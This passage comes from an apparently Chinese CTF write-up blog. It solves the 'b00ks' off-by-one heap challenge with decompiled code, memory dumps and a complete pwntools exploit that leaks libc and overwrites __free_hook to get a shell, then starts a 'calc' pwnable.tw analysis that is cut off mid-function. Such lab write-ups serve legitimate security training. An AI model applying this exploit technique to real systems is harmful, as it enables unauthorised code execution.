class="number">0L</span>L;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">0xA</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个难点就是泄露libc的基地址，因为开启了PIE，所以泄露libc的基地址就比较有难度了，这里采用的方法是通过申请一个大的空间，使得系统调用mmap()函数进行堆申请，如果我们能够泄露申请的堆地址，就能通过offset推导出libc的基地址。原因我们可以看下面这张图。<br><img src="/img/621.png" alt="我是图片"></p><h3 id="分步操作"><a href="#分步操作" class="headerlink" title="分步操作"></a>分步操作</h3><p>将Author_name置32位A，然后申请一个book，读取authorname即可泄露处第一个book的地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_bss_book_array1</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">    p.sendline(<span class="string">'A'</span>*<span class="number">32</span>)</span><br><span class="line">    add_book(<span class="string">"10"</span>,<span class="string">'A'</span>*<span class="number">10</span>,<span class="string">"256"</span>,<span class="string">'B'</span>*<span class="number">0x100</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Author: "</span>)</span><br><span class="line">    p.recv(<span class="number">32</span>)</span><br><span class="line">    leak_addr = p.recv(<span class="number">8</span>)</span><br><span class="line">    leak_addr = leak_addr.strip(<span class="string">"\n"</span>)</span><br><span class="line">    leak_addr = (u64(leak_addr.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)))</span><br><span class="line">    <span class="keyword">print</span>   <span class="string">"leak_book_array1' address is:"</span>,hex(leak_addr)</span><br><span class="line">    <span class="keyword">return</span> leak_addr</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000556BB9384040 author_name db &apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&apos;</span><br><span class="line">.bss:0000556BB9384040                                         ; DATA XREF: .data:p_author_name_0↑o</span><br><span class="line">.bss:0000556BB9384060 books_arry dq offset unk_556BBA871150   ; DATA XREF: .data:p_books_array↑o</span><br><span class="line">.bss:0000556BB9384068 dq offset unk_556BBA871180</span><br></pre></td></tr></table></figure><p>找准将book1的地址置零后的地址，修改其desciption，构成一个fake_book,地址动态调一下就能找准了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'B'</span>*(<span class="number">0x100</span>-book_arr1_addr_offset+<span class="number">0x10</span>) + p64(<span class="number">1</span>)+p64(book_arr1_addr+<span class="number">0x38</span>)+p64(book_arr1_addr+<span class="number">0x38</span>)+p64(<span class="number">0x123456</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_book2_descriptionptr_byedit_fake_book</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter the book id you want to edit: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter new book description: "</span>)</span><br><span class="line">    p.sendline(payload)</span><br></pre></td></tr></table></figure></p><p>payload中的地址我们指向第二个book，这样的话我们就能通过读写操作来更改和读取book2中的指针的值了。</p><p>通过off_by_one的操作来将book1地址最后一个字节置0，让其指向我们构造的fake_book.然后通过读fake_book指针的值来泄露mmap地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">off_by_one_ope</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"5"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter author name: "</span>)</span><br><span class="line">    p.sendline(<span class="string">'A'</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_mmap_address</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Name: "</span>)</span><br><span class="line">    leak_addr = p.recvline()</span><br><span class="line">    leak_addr = leak_addr.strip(<span class="string">"\n"</span>)</span><br><span class="line">    leak_addr = u64(leak_addr.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">    <span class="keyword">return</span> leak_addr</span><br></pre></td></tr></table></figure></p><p>内存分布如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000556BB9384040 author_name db &apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&apos;</span><br><span class="line">.bss:0000556BB9384040                                         ; DATA XREF: .data:p_author_name_0↑o</span><br><span class="line">.bss:0000556BB9384060 books_arry dq offset unk_556BBA871100   ; DATA XREF: .data:p_books_array↑o</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[heap]:0000556BBA871100 qword_556BBA871100 dq 1</span><br><span class="line">[heap]:0000556BBA871108 dq offset unk_556BBA871188</span><br><span class="line">[heap]:0000556BBA871110 dq offset unk_556BBA871188</span><br><span class="line">[heap]:0000556BBA871118 dq 123456h</span><br></pre></td></tr></table></figure><p>通过写fake_book的指针，将book2的description的地址写为libc_free_hook的地址，然后通过写book2的desciption又将libc_free_hook写为libc中存在的l函数实现了execve(“/bin/sh”,  null,  environ)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_book2_descriptionptr_byedit_fake_book</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter the book id you want to edit: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter new book description: "</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_book2_decription_content_to_execve</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter the book id you want to edit: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter new book description: "</span>)</span><br><span class="line">    p.sendline(payload)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">p = process(<span class="string">"./b00ks.dms"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_book</span><span class="params">(name_size,name,desc_size,desciption)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter book name size: "</span>)</span><br><span class="line">    p.sendline(name_size)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter book name (Max 32 chars): "</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter book description size: "</span>)</span><br><span class="line">    p.sendline(desc_size)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter book description: "</span>)</span><br><span class="line">    p.sendline(desciption)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_bss_book_array1</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">    p.sendline(<span class="string">'A'</span>*<span class="number">32</span>)</span><br><span class="line">    add_book(<span class="string">"10"</span>,<span class="string">'A'</span>*<span class="number">10</span>,<span class="string">"256"</span>,<span class="string">'B'</span>*<span class="number">0x100</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Author: "</span>)</span><br><span class="line">    p.recv(<span class="number">32</span>)</span><br><span class="line">    leak_addr = p.recv(<span class="number">8</span>)</span><br><span class="line">    leak_addr = leak_addr.strip(<span class="string">"\n"</span>)</span><br><span class="line">    leak_addr = (u64(leak_addr.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)))</span><br><span class="line">    <span class="keyword">print</span>   <span class="string">"leak_book_array1' address is:"</span>,hex(leak_addr)</span><br><span class="line">    <span class="keyword">return</span> leak_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_book1desc_to_fake_book</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter the book id you want to edit: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter new book description: "</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">off_by_one_ope</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"5"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter author name: "</span>)</span><br><span class="line">    p.sendline(<span class="string">'A'</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_mmap_address</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Name: "</span>)</span><br><span class="line">    leak_addr = p.recvline()</span><br><span class="line">    leak_addr = leak_addr.strip(<span class="string">"\n"</span>)</span><br><span class="line">    leak_addr = u64(leak_addr.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">    <span class="keyword">return</span> leak_addr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_book2_descriptionptr_byedit_fake_book</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter the book id you want to edit: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter new book description: "</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_book2_decription_content_to_execve</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter the book id you want to edit: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Enter new book description: "</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_book</span><span class="params">()</span>:</span></span><br><span class="line">     p.sendline(<span class="string">"2"</span>)</span><br><span class="line">     log.info(p.recvuntil(<span class="string">":"</span>))</span><br><span class="line">     p.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">pdb.set_trace()</span><br><span class="line">book_arr1_addr = leak_bss_book_array1()</span><br><span class="line">book_arr1_addr_offset = book_arr1_addr &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"book_arr1_addr_offset is :"</span> ,hex(book_arr1_addr_offset)</span><br><span class="line"><span class="keyword">if</span> book_arr1_addr_offset &lt; <span class="number">0x30</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"offset is too small,please try again!"</span></span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">add_book(<span class="string">"135168"</span>,<span class="string">'C'</span>*<span class="number">135168</span>,<span class="string">"135168"</span>,<span class="number">135168</span>*<span class="string">'D'</span>)</span><br><span class="line">payload = <span class="string">'B'</span>*(<span class="number">0x100</span>-book_arr1_addr_offset+<span class="number">0x10</span>) + p64(<span class="number">1</span>)+p64(book_arr1_addr+<span class="number">0x38</span>)+p64(book_arr1_addr+<span class="number">0x38</span>)+p64(<span class="number">0x123456</span>)</span><br><span class="line">edit_book1desc_to_fake_book(payload)</span><br><span class="line">off_by_one_ope()</span><br><span class="line">leaked_mmap_addr = leak_mmap_address()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"leaked_mmap_addr:"</span> ,hex(leaked_mmap_addr)</span><br><span class="line"><span class="comment">####0x00007F34BF8C2010 libc_2.23.so00007F34BF31400000007F34BF4D4000R.XD.byte0000publicCODE6400000000000000000000</span></span><br><span class="line">libc_offset = <span class="number">0x00007F34BF8C2010</span> - <span class="number">0x00007F34BF314000</span></span><br><span class="line">libc_base = leaked_mmap_addr - libc_offset</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br><span class="line"></span><br><span class="line">libc_free_hook = elf.symbols[<span class="string">'__free_hook'</span>] + libc_base</span><br><span class="line">exec_ptr = <span class="number">0x4526a</span> + libc_base</span><br><span class="line">change_book2_descriptionptr_byedit_fake_book(p64(libc_free_hook)*<span class="number">2</span>)</span><br><span class="line">change_book2_decription_content_to_execve(p64(exec_ptr))</span><br><span class="line"></span><br><span class="line">free_book()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/heap_overview/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/heap/heap_overview/</a><br><a href="https://bbs.pediy.com/thread-225611.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-225611.htm</a></p><h3 id="题目链接："><a href="#题目链接：" class="headerlink" title="题目链接："></a>题目链接：</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h3&gt;&lt;p&gt;这道题目的考察点是off-by-one,其实具体来讲是一个堆溢出，只不过这个堆溢出只能溢出一个字节而已，但是通过这一个字节就能导致能够构建一
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>pwnable.tw-calc</title>
    <link href="https://foyjog.github.io/2018/05/07/pwnable-tw-calc/"/>
    <id>https://foyjog.github.io/2018/05/07/pwnable-tw-calc/</id>
    <published>2018-05-07T07:07:02.000Z</published>
    <updated>2018-07-03T08:18:35.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h3><p>这道题目的点还是很难catch到的，通过分析calc的整个布局才能抓到点，因为参考了别人的writeup，这里只贴一下分析的代码好了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">parse_expr</span><span class="params">(<span class="keyword">char</span> *p_original_expression, pool_struct *p_pool_v1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// ST2C_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *p_original_expression2; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *s1; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  p_original_expression2 = p_original_expression;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  bzero(s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(p_original_expression[i] - <span class="string">'0'</span>) &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (<span class="keyword">char</span> *)(&amp;p_original_expression[i] - p_original_expression2);<span class="comment">// 提取运算数</span></span><br><span class="line">      s1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v2 + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(s1, p_original_expression2, v2);</span><br><span class="line">      s1[(_DWORD)v2] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">"0"</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"prevent division by zero"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = atoi(s1);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = p_pool_v1-&gt;expr_count++;</span><br><span class="line">        *(&amp;p_pool_v1-&gt;expr1 + v4) = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( p_original_expression[i] &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(p_original_expression[i + <span class="number">1</span>] - <span class="number">48</span>) &gt; <span class="number">9</span> )<span class="comment">// 运算符没有右运算数</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"expression error!"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      p_original_expression2 = &amp;p_original_expression[i + <span class="number">1</span>];</span><br><span class="line">      <span class="keyword">if</span> ( s[v7] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( p_original_expression[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'%'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">            <span class="keyword">if</span> ( s[v7] != <span class="string">'+'</span> &amp;&amp; s[v7] != <span class="string">'-'</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              eval((<span class="keyword">int</span>)p_pool_v1, s[v7]);</span><br><span class="line">              s[v7] = p_original_expression[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              s[++v7] = p_original_expression[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">            eval((<span class="keyword">int</span>)p_pool_v1, s[v7]);</span><br><span class="line">            s[v7] = p_original_expression[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval((<span class="keyword">int</span>)p_pool_v1, s[v7--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[v7] = p_original_expression[i];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !p_original_expression[i] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v7 &gt;= <span class="number">0</span> )</span><br><span class="line">    eval((<span class="keyword">int</span>)p_pool_v1, s[v7--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>有问题的地方在eval函数里面，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">eval</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> oper)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( oper == <span class="string">'+'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">4</span> * (*(_DWORD *)a1 - <span class="number">2</span>) + <span class="number">4</span>) += *(_DWORD *)(a1 + <span class="number">4</span> * (*(_DWORD *)a1 - <span class="number">1</span>) + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( oper &gt; <span class="string">'+'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( oper == <span class="string">'-'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">4</span> * (*(_DWORD *)a1 - <span class="number">2</span>) + <span class="number">4</span>) -= *(_DWORD *)(a1 + <span 